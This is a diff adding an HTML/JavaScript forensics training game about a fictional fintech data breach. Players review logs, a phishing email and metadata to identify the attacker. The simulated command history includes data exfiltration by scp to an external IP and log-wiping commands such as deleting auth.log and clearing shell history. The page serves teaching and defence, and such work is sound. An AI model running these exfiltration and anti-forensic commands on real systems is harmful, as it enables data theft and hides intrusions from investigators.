@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Forensics Challenge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #212529;
+            --secondary-color: #495057;
+            --accent-color: #6c757d;
+            --text-color: #333333;
+            --light-bg: #f8f9fa;
+            --dark-bg: #212529;
+            --terminal-bg: #1e1e1e;
+            --terminal-text: #33ff00;
+            --border-radius: 4px;
+            --box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Times New Roman", Times, serif;
+            font-style: italic;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--light-bg);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .game-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .game-title {
+            font-size: 32px;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+
+        .game-subtitle {
+            font-size: 18px;
+            color: var(--secondary-color);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .game-container {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .sidebar {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 20px;
+        }
+
+        .mission-brief {
+            margin-bottom: 30px;
+        }
+
+        .mission-title {
+            font-size: 20px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .mission-title i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+        }
+
+        .mission-desc {
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .evidence-list {
+            list-style-type: none;
+        }
+
+        .evidence-item {
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #f8f9fa;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+        }
+
+        .evidence-item:hover {
+            background-color: #e9ecef;
+        }
+
+        .evidence-item.active {
+            background-color: #e9ecef;
+            border-left: 3px solid var(--secondary-color);
+        }
+
+        .evidence-icon {
+            margin-right: 10px;
+            width: 24px;
+            text-align: center;
+        }
+
+        .notebook {
+            margin-top: 30px;
+        }
+
+        .notebook-title {
+            font-size: 18px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .notebook-title i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+        }
+
+        .notebook-content {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            min-height: 200px;
+            resize: none;
+            width: 100%;
+            font-family: inherit;
+            font-style: italic;
+        }
+
+        .clue-counter {
+            margin-top: 10px;
+            font-size: 14px;
+            color: var(--secondary-color);
+            text-align: right;
+        }
+
+        .work-area {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .evidence-viewer {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            flex-grow: 1;
+            min-height: 500px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .evidence-view {
+            padding: 20px;
+            height: 100%;
+            display: none;
+        }
+
+        .evidence-view.active {
+            display: block;
+        }
+
+        .viewer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #f1f3f5;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .viewer-title {
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+
+        .viewer-title i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+        }
+
+        .viewer-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .viewer-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--secondary-color);
+            transition: color 0.2s ease;
+        }
+
+        .viewer-btn:hover {
+            color: var(--primary-color);
+        }
+
+        .img-viewer img {
+            max-width: 100%;
+            max-height: 400px;
+            display: block;
+            margin: 20px auto;
+            border: 1px solid #dee2e6;
+        }
+
+        .text-viewer {
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-style: normal;
+            border: 1px solid #dee2e6;
+            padding: 15px;
+            margin: 20px 0;
+            background-color: #f8f9fa;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .terminal-viewer {
+            background-color: var(--terminal-bg);
+            color: var(--terminal-text);
+            font-family: 'Courier New', monospace;
+            font-style: normal;
+            padding: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin: 20px 0;
+        }
+
+        .terminal-prompt {
+            display: flex;
+            margin-bottom: 10px;
+        }
+
+        .terminal-prompt::before {
+            content: "$ ";
+            margin-right: 10px;
+        }
+
+        .email-viewer {
+            background-color: white;
+            border: 1px solid #dee2e6;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .email-header {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .email-field {
+            margin-bottom: 5px;
+        }
+
+        .email-label {
+            font-weight: bold;
+            display: inline-block;
+            width: 70px;
+        }
+
+        .email-body {
+            padding: 15px;
+            font-family: Arial, sans-serif;
+            font-style: normal;
+        }
+
+        .metadata-viewer {
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-style: normal;
+        }
+
+        .metadata-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .metadata-table th, .metadata-table td {
+            padding: 8px 15px;
+            text-align: left;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .metadata-table th {
+            background-color: #f1f3f5;
+            font-weight: bold;
+        }
+
+        .hidden-data {
+            display: none;
+        }
+
+        .solution-panel {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .solution-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .solution-title {
+            font-size: 18px;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+        }
+
+        .solution-title i {
+            margin-right: 10px;
+            color: var(--secondary-color);
+        }
+
+        .solution-form {
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dee2e6;
+            border-radius: var(--border-radius);
+            font-family: inherit;
+            font-style: italic;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            font-family: inherit;
+            font-style: italic;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-color);
+        }
+
+        .feedback {
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-top: 15px;
+            display: none;
+        }
+
+        .feedback.success {
+            background-color: rgba(25, 135, 84, 0.1);
+            border: 1px solid rgba(25, 135, 84, 0.2);
+            color: #0f5132;
+        }
+
+        .feedback.error {
+            background-color: rgba(220, 53, 69, 0.1);
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            color: #842029;
+        }
+
+        .feedback-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .feedback-title i {
+            margin-right: 8px;
+        }
+
+        .completion-container {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .completion-badge {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 30px;
+            background-color: rgba(25, 135, 84, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .completion-badge i {
+            font-size: 70px;
+            color: #198754;
+        }
+
+        .completion-title {
+            font-size: 28px;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .completion-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .hint-container {
+            margin-top: 20px;
+        }
+
+        .hint-button {
+            background: none;
+            border: none;
+            color: var(--secondary-color);
+            text-decoration: underline;
+            cursor: pointer;
+            font-family: inherit;
+            font-style: italic;
+            padding: 0;
+        }
+
+        .hint-content {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        @media (max-width: 992px) {
+            .game-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="game-header">
+            <h1 class="game-title">Digital Forensics Challenge</h1>
+            <p class="game-subtitle">Put your cybersecurity investigation skills to the test. Analyze digital evidence to solve the case and identify the culprit behind a data breach.</p>
+        </div>
+
+        <div class="game-container" id="game-container">
+            <div class="sidebar">
+                <div class="mission-brief">
+                    <h2 class="mission-title"><i class="fas fa-briefcase"></i> Mission Brief</h2>
+                    <p class="mission-desc">A financial technology company has experienced a data breach. Customer financial data was exfiltrated from their systems. Your task is to analyze the digital evidence collected and determine:</p>
+                    <ul class="mission-objectives" style="padding-left: 20px;">
+                        <li>Who was responsible for the breach</li>
+                        <li>How they gained access to the system</li>
+                        <li>What specific data was compromised</li>
+                        <li>When the breach occurred</li>
+                    </ul>
+                </div>
+
+                <div class="evidence-container">
+                    <h2 class="mission-title"><i class="fas fa-folder-open"></i> Evidence Files</h2>
+                    <ul class="evidence-list">
+                        <li class="evidence-item" data-target="evidence1">
+                            <div class="evidence-icon"><i class="fas fa-file-image"></i></div>
+                            <div class="evidence-name">Security Camera Image</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence2">
+                            <div class="evidence-icon"><i class="fas fa-file-alt"></i></div>
+                            <div class="evidence-name">System Log Excerpt</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence3">
+                            <div class="evidence-icon"><i class="fas fa-terminal"></i></div>
+                            <div class="evidence-name">Command History</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence4">
+                            <div class="evidence-icon"><i class="fas fa-envelope"></i></div>
+                            <div class="evidence-name">Suspicious Email</div>
+                        </li>
+                        <li class="evidence-item" data-target="evidence5">
+                            <div class="evidence-icon"><i class="fas fa-file-code"></i></div>
+                            <div class="evidence-name">Metadata Analysis</div>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="notebook">
+                    <h2 class="notebook-title"><i class="fas fa-book"></i> Investigator's Notebook</h2>
+                    <textarea class="notebook-content" id="notebook" placeholder="Take notes on your findings here..."></textarea>
+                    <div class="clue-counter">Clues found: <span id="clue-counter">0</span>/12</div>
+                </div>
+            </div>
+
+            <div class="work-area">
+                <div class="evidence-viewer">
+                    <div class="viewer-header">
+                        <div class="viewer-title">
+                            <i class="fas fa-search"></i>
+                            <span id="current-evidence">Select evidence to begin investigation</span>
+                        </div>
+                        <div class="viewer-controls">
+                            <button class="viewer-btn" id="zoom-in"><i class="fas fa-search-plus"></i></button>
+                            <button class="viewer-btn" id="zoom-out"><i class="fas fa-search-minus"></i></button>
+                            <button class="viewer-btn" id="analyze-btn"><i class="fas fa-microscope"></i> Analyze</button>
+                        </div>
+                    </div>
+
+                    <!-- Evidence Views -->
+                    <div class="evidence-view" id="evidence1">
+                        <div class="img-viewer">
+                            <img src="/api/placeholder/800/450" alt="Security camera footage showing office area" id="security-image">
+                            <p class="img-caption">Security camera footage from the server room, timestamped 2023-03-15 02:34:17</p>
+                        </div>
+                        <div class="hidden-data" id="evidence1-details">
+                            <ul>
+                                <li>Image shows afterhours access to the server room</li>
+                                <li>Person appears to be using a badge that is not their own</li>
+                                <li>Badge visible in image belongs to "Sarah Chen, IT Support"</li>
+                                <li>Person in image is not Sarah Chen</li>
+                                <li>Timestamp shows access at 2:34 AM, outside normal working hours</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence2">
+                        <pre class="text-viewer">
+[2023-03-15 02:12:03] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:12:17] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:12:42] Failed login attempt for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:13:05] Successful login for user schen@fintechcorp.com from IP 192.168.1.45
+[2023-03-15 02:15:32] User schen@fintechcorp.com accessed database customers_financial_records
+[2023-03-15 02:18:47] Large data export initiated by user schen@fintechcorp.com (10.2 GB)
+[2023-03-15 02:24:15] SSH connection established from IP 192.168.1.45 to external server 45.77.65.211
+[2023-03-15 02:26:33] File transfer initiated: customers_financial_records.sql to 45.77.65.211
+[2023-03-15 02:30:12] File transfer complete
+[2023-03-15 02:31:05] User schen@fintechcorp.com executed command: rm /var/log/auth.log
+[2023-03-15 02:32:44] User schen@fintechcorp.com executed command: history -c
+[2023-03-15 02:33:16] User schen@fintechcorp.com executed command: rm .bash_history
+[2023-03-15 02:35:01] User schen@fintechcorp.com logged out
+
+[2023-03-15 09:15:22] User schen@fintechcorp.com logged in from IP 192.168.1.156
+[2023-03-15 09:17:45] User schen@fintechcorp.com reported lost access badge to security
+                        </pre>
+                        <div class="hidden-data" id="evidence2-details">
+                            <ul>
+                                <li>Multiple failed login attempts indicate possible brute force attack</li>
+                                <li>Login IP (192.168.1.45) is different from Sarah's normal login IP (192.168.1.156)</li>
+                                <li>Large data export of customer financial records occurred</li>
+                                <li>Data was transferred to external IP 45.77.65.211</li>
+                                <li>Attacker attempted to erase evidence by deleting log files</li>
+                                <li>Sarah Chen reported her badge missing the next morning</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence3">
+                        <div class="terminal-viewer">
+                            <div class="terminal-prompt">ssh schen@internal-database</div>
+                            <div class="terminal-output">Last login: Tue Mar 14 17:45:32 2023 from 192.168.1.156</div>
+                            <div class="terminal-prompt">cd /var/db/customers</div>
+                            <div class="terminal-prompt">ls -la</div>
+                            <div class="terminal-output">total 1.2G
+drwxr-xr-x 2 dbadmin staff    4096 Mar 14 16:30 .
+drwxr-xr-x 5 dbadmin staff    4096 Mar 10 09:12 ..
+-rw-r----- 1 dbadmin staff    1.2G Mar 14 16:30 customers_financial_records.sql
+-rw-r----- 1 dbadmin staff    2.4M Mar 14 16:30 transactions_march.sql</div>
+                            <div class="terminal-prompt">mysqldump -u admin -p customers_db > /tmp/customers_financial_records.sql</div>
+                            <div class="terminal-output">Enter password:
+******</div>
+                            <div class="terminal-prompt">scp /tmp/customers_financial_records.sql remote-user@45.77.65.211:/home/remote-user/data/</div>
+                            <div class="terminal-output">remote-user@45.77.65.211's password:
+******
+customers_financial_records.sql                          100% 10.2GB   5.8MB/s   29:45</div>
+                            <div class="terminal-prompt">whois 45.77.65.211</div>
+                            <div class="terminal-output">% Information related to '45.77.65.211'
+
+Country:     Russian Federation
+Org:         ShadowHost Services
+Admin-c:     REDACTED
+Tech-c:      REDACTED
+Created:     2022-12-10
+Last-modified: 2023-01-05</div>
+                            <div class="terminal-prompt">rm /var/log/auth.log</div>
+                            <div class="terminal-prompt">history -c</div>
+                            <div class="terminal-prompt">rm .bash_history</div>
+                            <div class="terminal-prompt">exit</div>
+                        </div>
+                        <div class="hidden-data" id="evidence3-details">
+                            <ul>
+                                <li>SSH login using Sarah Chen's credentials</li>
+                                <li>Database dump of customer financial records</li>
+                                <li>Data sent to server in Russia (45.77.65.211)</li>
+                                <li>Use of "whois" command to confirm server location</li>
+                                <li>ShadowHost Services is known to provide anonymous hosting</li>
+                                <li>Attempts to cover tracks by clearing command history</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence4">
+                        <div class="email-viewer">
+                            <div class="email-header">
+                                <div class="email-field">
+                                    <span class="email-label">From:</span>
+                                    <span class="email-value">IT-Support@fintechcorp-itservices.com</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">To:</span>
+                                    <span class="email-value">schen@fintechcorp.com</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">Date:</span>
+                                    <span class="email-value">March 14, 2023 4:45 PM</span>
+                                </div>
+                                <div class="email-field">
+                                    <span class="email-label">Subject:</span>
+                                    <span class="email-value">Urgent: Password Reset Required</span>
+                                </div>
+                            </div>
+                            <div class="email-body">
+                                <p>Dear Sarah Chen,</p>
+                                <p>Our security system has detected unusual login attempts to your account. As a precautionary measure, we have temporarily locked your account.</p>
+                                <p>Please click the link below to verify your identity and reset your password:</p>
+                                <p><a href="#">https://fintechcorp-secure.com/password-reset?token=a1b2c3d4</a></p>
+                                <p>If you did not attempt to log in, please contact security immediately.</p>
+                                <p>Thank you,<br>
+                                IT Support Team<br>
+                                FinTechCorp</p>
+                                <img src="/api/placeholder/250/80" alt="FinTechCorp Logo">
+                            </div>
+                        </div>
+                        <div class="hidden-data" id="evidence4-details">
+                            <ul>
+                                <li>Phishing email sent to Sarah Chen day before breach</li>
+                                <li>Email domain "fintechcorp-itservices.com" is suspicious (legitimate would be "fintechcorp.com")</li>
+                                <li>URL "fintechcorp-secure.com" is not the company's genuine domain</li>
+                                <li>Email was sent during normal business hours to appear legitimate</li>
+                                <li>Email design and logo closely mimic official communications</li>
+                                <li>Creates urgency to trick recipient into clicking</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="evidence-view" id="evidence5">
+                        <div class="metadata-viewer">
+                            <h3>File Access Metadata Analysis</h3>
+                            <table class="metadata-table">
+                                <thead>
+                                    <tr>
+                                        <th>File</th>
+                                        <th>Last Accessed</th>
+                                        <th>Access IP</th>
+                                        <th>User</th>
+                                        <th>Access Type</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>/var/db/customers/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:15:32</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>READ</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/tmp/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:18:47</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>WRITE</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/tmp/customers_financial_records.sql</td>
+                                        <td>2023-03-15 02:26:33</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>READ</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/var/log/auth.log</td>
+                                        <td>2023-03-15 02:31:05</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>DELETE</td>
+                                    </tr>
+                                    <tr>
+                                        <td>/home/schen/.bash_history</td>
+                                        <td>2023-03-15 02:33:16</td>
+                                        <td>192.168.1.45</td>
+                                        <td>schen@fintechcorp.com</td>
+                                        <td>DELETE</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h3 style="margin-top: 20px;">Network Connection Log</h3>
+                            <table class="metadata-table">
+                                <thead>
+                                    <tr>
+                                        <th>Timestamp</th>
+                                        <th>Source IP</th>
+                                        <th>Destination IP</th>
+                                        <th>Protocol</th>
+                                        <th>Bytes Transferred</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>2023-03-14 16:42:15</td>
+                                        <td>203.0.113.42</td>
+                                        <td>192.168.1.156</td>
+                                        <td>HTTP</td>
+                                        <td>45,320</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:03:22</td>
+                                        <td>203.0.113.42</td>
+                                        <td>192.168.1.45</td>
+                                        <td>SSH</td>
+                                        <td>12,864</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:24:15</td>
+                                        <td>192.168.1.45</td>
+                                        <td>45.77.65.211</td>
+                                        <td>SSH/SCP</td>
+                                        <td>10,964,211,712</td>
+                                    </tr>
+                                    <tr>
+                                        <td>2023-03-15 02:35:48</td>
+                                        <td>192.168.1.45</td>
+                                        <td>203.0.113.42</td>
+                                        <td>SSH</td>
+                                        <td>8,432</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <div class="hidden-data" id="evidence5-details">
+                            <ul>
+                                <li>External IP 203.0.113.42 connected to both Sarah's computer (192.168.1.156) and the attacker's location (192.168.1.45)</li>
+                                <li>The attacker's IP (192.168.1.45) belongs to the company guest WiFi network</li>
+                                <li>Over 10GB of data was transferred to the Russian server</li>
+                                <li>Connection from attacker back to 203.0.113.42 after data theft suggests command and control server</li>
+                                <li>Timeline matches security camera footage showing physical access to server room</li>
+                                <li>Pattern suggests coordinated attack: phishing + physical access + data exfiltration</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="solution-panel">
+                    <div class="solution-header">
+                        <h2 class="solution-title"><i class="fas fa-clipboard-check"></i> Case Solution</h2>
+                        <div class="hint-container">
+                            <button class="hint-button" id="hint-button">Need a hint?</button>
+                            <div class="hint-content" id="hint-content">
+                                <p>Look carefully at all evidence files. Pay special attention to:</p>
+                                <ul>
+                                    <li>The timeline across different evidence files</li>
+                                    <li>IP addresses and their connections</li>
+                                    <li>The phishing email domain vs. the legitimate company domain</li>
+                                    <li>Physical access evidence combined with digital evidence</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="solution-form" id="solution-form">
+                        <div class="form-group">
+                            <label class="form-label">Who was responsible for the breach?</label>
+                            <input type="text" class="form-control" id="solution-who" placeholder="Enter the person or group responsible">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">How did they gain access to the system?</label>
+                            <textarea class="form-control" id="solution-how" rows="3" placeholder="Describe the method used to gain access"></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">What data was compromised?</label>
+                            <input type="text" class="form-control" id="solution-what" placeholder="Specify the data that was stolen">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">When did the breach occur? (YYYY-MM-DD HH:MM format)</label>
+                            <input type="text" class="form-control" id="solution-when" placeholder="Enter the date and time">
+                        </div>
+
+                        <button class="btn" id="submit-btn">Submit Solution</button>
+                    </div>
+
+                    <div class="feedback" id="feedback">
+                        <div class="feedback-title">
+                            <i class="fas fa-check-circle"></i>
+                            <span id="feedback-title-text">Correct!</span>
+                        </div>
+                        <p id="feedback-message"></p>
+                    </div>
+
+                    <div class="completion-container" id="completion-container">
+                        <div class="completion-badge">
+                            <i class="fas fa-user-shield"></i>
+                        </div>
+                        <h2 class="completion-title">Case Solved!</h2>
+                        <p class="completion-message">Congratulations! You've successfully solved the digital forensics case and identified the cybercriminal responsible for the data breach.</p>
+                        <p>Your analysis demonstrates strong skills in:</p>
+                        <ul style="text-align: left; max-width: 500px; margin: 0 auto; padding-left: 30px;">
+                            <li>Digital evidence analysis</li>
+                            <li>Log file interpretation</li>
+                            <li>Network traffic analysis</li>
+                            <li>Phishing detection</li>
+                            <li>Timeline reconstruction</li>
+                        </ul>
+                        <button class="btn" id="reset-btn" style="margin-top: 20px;">Solve Another Case</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get DOM elements
+            const evidenceItems = document.querySelectorAll('.evidence-item');
+            const evidenceViews = document.querySelectorAll('.evidence-view');
+            const currentEvidenceTitle = document.getElementById('current-evidence');
+            const analyzeBtn = document.getElementById('analyze-btn');
+            const notebook = document.getElementById('notebook');
+            const clueCounter = document.getElementById('clue-counter');
+            const hintButton = document.getElementById('hint-button');
+            const hintContent = document.getElementById('hint-content');
+            const submitBtn = document.getElementById('submit-btn');
+            const feedback = document.getElementById('feedback');
+            const feedbackTitleText = document.getElementById('feedback-title-text');
+            const feedbackMessage = document.getElementById('feedback-message');
+            const resetBtn = document.getElementById('reset-btn');
+            const completionContainer = document.getElementById('completion-container');
+            const solutionForm = document.getElementById('solution-form');
+
+            // Game state
+            let currentEvidence = null;
+            let cluesFound = [];
+            let totalClues = 12; // Total number of unique clues across all evidence
+
+            // Initialize game
+            initGame();
+
+            // Initialize game state
+            function initGame() {
+                cluesFound = [];
+                updateClueCounter();
+                resetForm();
+
+                // Hide all evidence views initially
+                evidenceViews.forEach(view => {
+                    view.classList.remove('active');
+                });
+
+                // Reset evidence items
+                evidenceItems.forEach(item => {
+                    item.classList.remove('active');
+                });
+
+                currentEvidenceTitle.textContent = 'Select evidence to begin investigation';
+                feedback.style.display = 'none';
+                completionContainer.style.display = 'none';
+                solutionForm.style.display = 'block';
+            }
+
+            // Add click event listeners to evidence items
+            evidenceItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    const targetId = this.getAttribute('data-target');
+
+                    // Remove active class from all items
+                    evidenceItems.forEach(i => i.classList.remove('active'));
+
+                    // Add active class to clicked item
+                    this.classList.add('active');
+
+                    // Hide all evidence views
+                    evidenceViews.forEach(view => {
+                        view.classList.remove('active');
+                    });
+
+                    // Show selected evidence view
+                    const targetView = document.getElementById(targetId);
+                    targetView.classList.add('active');
+
+                    // Update current evidence title
+                    currentEvidenceTitle.textContent = this.querySelector('.evidence-name').textContent;
+
+                    // Store current evidence ID
+                    currentEvidence = targetId;
+                });
+            });
+
+            // Add click event listener to analyze button
+            analyzeBtn.addEventListener('click', function() {
+                if (!currentEvidence) return;
+
+                // Get details for current evidence
+                const detailsContainer = document.getElementById(currentEvidence + '-details');
+
+                if (detailsContainer) {
+                    const details = detailsContainer.querySelectorAll('li');
+                    let newCluesFound = false;
+
+                    // Check each clue from the current evidence
+                    details.forEach(detail => {
+                        const clueText = detail.textContent;
+
+                        // If this clue hasn't been found yet
+                        if (!cluesFound.includes(clueText)) {
+                            cluesFound.push(clueText);
+                            newCluesFound = true;
+
+                            // Add clue to notebook
+                            if (notebook.value === '') {
+                                notebook.value = '• ' + clueText;
+                            } else {
+                                notebook.value += '\n• ' + clueText;
+                            }
+                        }
+                    });
+
+                    if (newCluesFound) {
+                        updateClueCounter();
+                        alert('New evidence detected! Clues added to your notebook.');
+                    } else {
+                        alert('No new clues found in this evidence.');
+                    }
+                }
+            });
+
+            // Add click event listener to hint button
+            hintButton.addEventListener('click', function() {
+                if (hintContent.style.display === 'block') {
+                    hintContent.style.display = 'none';
+                } else {
+                    hintContent.style.display = 'block';
+                }
+            });
+
+            // Add click event listener to submit button
+            submitBtn.addEventListener('click', function() {
+                const who = document.getElementById('solution-who').value.trim().toLowerCase();
+                const how = document.getElementById('solution-how').value.trim().toLowerCase();
+                const what = document.getElementById('solution-what').value.trim().toLowerCase();
+                const when = document.getElementById('solution-when').value.trim();
+
+                // Check if all fields are filled
+                if (!who || !how || !what || !when) {
+                    showFeedback(false, 'Please fill in all fields to submit your solution.');
+                    return;
+                }
+
+                // Check solution
+                let correct = true;
+                let feedbackText = '';
+
+                // Check "who"
+                if (!who.includes('external') || !who.includes('attack') || !who.includes('hacker')) {
+                    correct = false;
+                    feedbackText += '• The perpetrator identification is incorrect. Review the evidence about the source of the attack.<br>';
+                }
+
+                // Check "how"
+                if (!how.includes('phishing') || !how.includes('badge') || !how.includes('stolen')) {
+                    correct = false;
+                    feedbackText += '• Your access method is incomplete. Look for evidence of both digital and physical security breaches.<br>';
+                }
+
+                // Check "what"
+                if (!what.includes('customer') || !what.includes('financial') || !what.includes('record')) {
+                    correct = false;
+                    feedbackText += '• The compromised data description is incorrect. Check the database and file names in the evidence.<br>';
+                }
+
+                // Check "when"
+                if (!when.match(/2023-03-15 02:/)) {
+                    correct = false;
+                    feedbackText += '• The timing is incorrect. Look at the timestamps across different pieces of evidence.<br>';
+                }
+
+                if (correct) {
+                    showFeedback(true, 'Your analysis is correct! You\'ve successfully identified all aspects of the breach.');
+                    solutionForm.style.display = 'none';
+                    completionContainer.style.display = 'block';
+                } else {
+                    showFeedback(false, 'Your analysis contains some errors:<br>' + feedbackText + '<br>Review the evidence and try again.');
+                }
+            });
+
+            // Add click event listener to reset button
+            resetBtn.addEventListener('click', function() {
+                initGame();
+            });
+
+            // Update clue counter
+            function updateClueCounter() {
+                clueCounter.textContent = cluesFound.length + '/' + totalClues;
+            }
+
+            // Show feedback message
+            function showFeedback(isSuccess, message) {
+                feedback.className = isSuccess ? 'feedback success' : 'feedback error';
+                feedbackTitleText.textContent = isSuccess ? 'Correct!' : 'Try Again';
+                feedbackMessage.innerHTML = message;
+                feedback.style.display = 'block';
+            }
+
+            // Reset form
+            function resetForm() {
+                document.getElementById('solution-who').value = '';
+                document.getElementById('solution-how').value = '';
+                document.getElementById('solution-what').value = '';
+                document.getElementById('solution-when').value = '';
+                notebook.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
